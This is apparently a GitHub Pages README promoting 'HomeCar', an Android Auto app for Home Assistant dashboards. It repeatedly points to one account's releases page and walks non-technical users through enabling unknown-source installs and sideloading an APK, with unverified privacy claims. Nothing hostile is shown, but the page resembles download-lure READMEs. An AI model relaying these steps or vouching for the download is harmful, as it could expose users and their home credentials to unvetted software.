---
layout: "default"
title: "🏠 HomeCar - Your Smart Home, Now on the Road"
description: "Open Home Assistant dashboards directly in Android Auto with a full-screen WebView interface."
---
# 🏠 HomeCar - Your Smart Home, Now on the Road

[![Download HomeCar](https://img.shields.io/badge/Download-HomeCar-%23FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Actiniaalternanthera1370/HomeCar/releases)

---

## 🎯 What Is HomeCar?

HomeCar turns your Android Auto screen into a beautiful, full-screen dashboard for your smart home. If you use Home Assistant to control lights, thermostats, cameras, or locks, HomeCar lets you see and manage everything right from your car's display. No complicated setup. No coding required. Just download, connect, and control your home while you drive.

Think of it as a command center for your house, designed specifically for the car environment.

---

## ✨ Key Features

- **Full-Screen WebView Dashboard** – Displays your Home Assistant interface cleanly, with no distractions.
- **Configurable to Your Needs** – Adjust the view to show only what matters to you.
- **Optimized for Android Auto** – Simple, large buttons and easy navigation designed for quick glances while driving.
- **Open-Source and Free** – Forever. No subscriptions, no hidden costs.
- **Privacy-Focused** – Your data stays on your device and your Home Assistant server.
- **Compatible with Most Home Assistant Layouts** – Works with popular dashboards like Lovelace and custom themes.

---

## 🚀 Getting Started

Welcome aboard! If you've never installed an app from GitHub before, don't worry. This guide walks you through every step, with no technical knowledge required.

### 📥 Step 1: Download the Application

Visit this link to download the application:  
**[https://github.com/Actiniaalternanthera1370/HomeCar/releases](https://github.com/Actiniaalternanthera1370/HomeCar/releases)**

This page shows you all available versions. Look for the newest one at the top. The download link will be labeled clearly. Choose the file that matches your device – typically an `.apk` file for Android.

### 🗂️ Step 2: Allow Installation from Unknown Sources

Since this app is not from the Google Play Store, Android will ask for permission. Here's how:

1.  Open your device's **Settings**.
2.  Go to **Security** or **Apps** (the name varies by phone).
3.  Find the option **Install unknown apps**.
4.  Select your browser (like Chrome) and toggle **Allow from this source** to **ON**.

That's it. Safe, simple, and only applies to your browser.

### 📲 Step 3: Install HomeCar

1.  Open the downloaded file. Your phone will show a confirmation screen.
2.  Tap **Install**.
3.  Wait a few seconds. Once done, tap **Open**.

### 🔐 Step 4: Connect to Your Home Assistant

Now comes the fun part. HomeCar needs to know where your Home Assistant server lives.

1.  Launch HomeCar from your app drawer.
2.  You'll see a simple setup screen.
3.  Enter your Home Assistant URL. This is usually something like `http://192.168.1.100:8123` (your local IP) or your remote address (like `https://myhome.duckdns.org`).
4.  Tap **Connect**.
5.  If you have authentication enabled (you should), a browser window opens. Log in with your normal Home Assistant credentials.
6.  HomeCar saves this connection and loads your dashboard.

That's all. Your car screen now shows your home status.

---

## 🎨 Configuring Your Dashboard

HomeCar gives you a few easy ways to make the dashboard yours.

### 🔧 Basic Settings

Open the HomeCar settings menu (usually a gear icon on the main screen). Here you can:

- **Change the refresh rate** – How often the screen updates (default is every 5 seconds).
- **Enable dark mode** – Perfect for night driving.
- **Adjust text size** – Make everything bigger for readability.
- **Set a custom home screen** – If you have multiple views in Home Assistant, choose which one loads first.

### 💡 Pro Tip: Make a Car-Friendly View

For the best experience, create a dedicated dashboard in Home Assistant for your car. Use big buttons, high-contrast colors, and only the essentials – like garage door status, alarm state, and climate control. HomeCar displays this view beautifully.

---

## ❓ Frequently Asked Questions

#### 🙋 Is HomeCar safe to use while driving?

Yes. HomeCar is designed for glanceable information. The interface is clean and easy to read. However, always prioritize road safety. Do not interact with the screen while the car is moving – park first.

#### 📶 Does HomeCar need an internet connection?

Only if your Home Assistant server is remote. If you connect over your local Wi-Fi or hotspot, it works offline.

#### 🔄 How do I update HomeCar?

Check the same download page regularly. New versions are posted there. Download the new file and install it over the old one – your settings are preserved.

#### 🆘 What if I have problems?

First, make sure your Home Assistant is accessible on your network. Try opening its URL in your phone's normal browser. If that works, HomeCar should work too. For more help, check the repository's Issues tab or community forums.

#### 💾 Does HomeCar work with any phone?

HomeCar requires a phone that supports Android Auto. Most modern Android phones do. If your car supports Android Auto via USB or wireless, you're generally good to go.

---

## 🛠️ Troubleshooting & Support

Here are common issues and quick fixes.

### 📡 "Cannot Connect to Home Assistant"

- Check your URL – make sure it's exactly right (including the port).
- Turn off any VPN or firewall that might block local traffic.
- Try using `http://` instead of `https://` if your server doesn't have a secure certificate.

### 🔒 "Login Page Won't Load"

- Clear the app cache in Android settings.
- Restart HomeCar.
- Ensure your Home Assistant allows login from non-Hassio apps.

### 📱 "Dashboard Looks Weird on My Screen"

- Adjust text size and zoom in HomeCar settings.
- Switch to a simpler Home Assistant theme.
- Use the "fullscreen" option in HomeCar to hide status bars.

### 👨‍💻 Developer Support

This is an open-source project. If you find a bug, report it on the repository's Issues page. Include your device model, Android version, and a screenshot if possible. Contributions are always welcome!

---

## 🧪 Technical Requirements (Simple Terms)

This list uses plain English, not technical jargon.

- **A phone** – Running Android version 8.0 or newer.
- **Android Auto** – Set up and working in your car.
- **A Home Assistant server** – Version 2023.1 or later.
- **A connection** – Either a USB cable or wireless connection between your phone and your car's display.

That's it. No root, no special permissions, no weird developer tools.

---

## 🔒 Privacy & Security

Your privacy matters. HomeCar:

- Does **not** collect any data.
- Does **not** show ads.
- Does **not** require an account.
- Does **not** access your location, contacts, or other personal apps.

All communication happens directly between your phone and your Home Assistant server, over your own network.

---

## 🧑‍🤝‍🧑 Community & Contribution

HomeCar is built by the community, for the community. If you're curious about the code or want to help improve it:

- 🌟 Star the repository to show support.
- 🐛 Report issues and suggest new features.
- 🤝 Submit pull requests on GitHub.

Together, we can make smart home control while driving even better.

---

## 📄 License

This project is open-source and free to use. You can modify and distribute it under the terms of its open-source license. See the repository for full details.

---

## ⏩ Final Checklist: Download and Run

Here is your simple to-do list:

1. ✅ Go to the [download page](https://github.com/Actiniaalternanthera1370/HomeCar/releases).
2. ✅ Download the latest `.apk` file.
3. ✅ Allow installation from unknown sources (if needed).
4. ✅ Install and open the app.
5. ✅ Enter your Home Assistant URL.
6. ✅ Log in.
7. ✅ Enjoy your smart home on the road!

That's the whole process. No command prompt, no copy-paste code, no configuration files. If you can use a browser, you can use HomeCar.

---

## 🔗 Quick Links

- **Download HomeCar**: [https://github.com/Actiniaalternanthera1370/HomeCar/releases](https://github.com/Actiniaalternanthera1370/HomeCar/releases)
- **Repository**: [https://github.com/Actiniaalternanthera1370/HomeCar](https://github.com/Actiniaalternanthera1370/HomeCar)
- **Home Assistant**: [https://www.home-assistant.io](https://www.home-assistant.io)

---

Keywords: android, android-application, android-auto, android-automation, android-automotive, automotive, dashboard, home-assistant, home-automation, open-source, smart-home, webview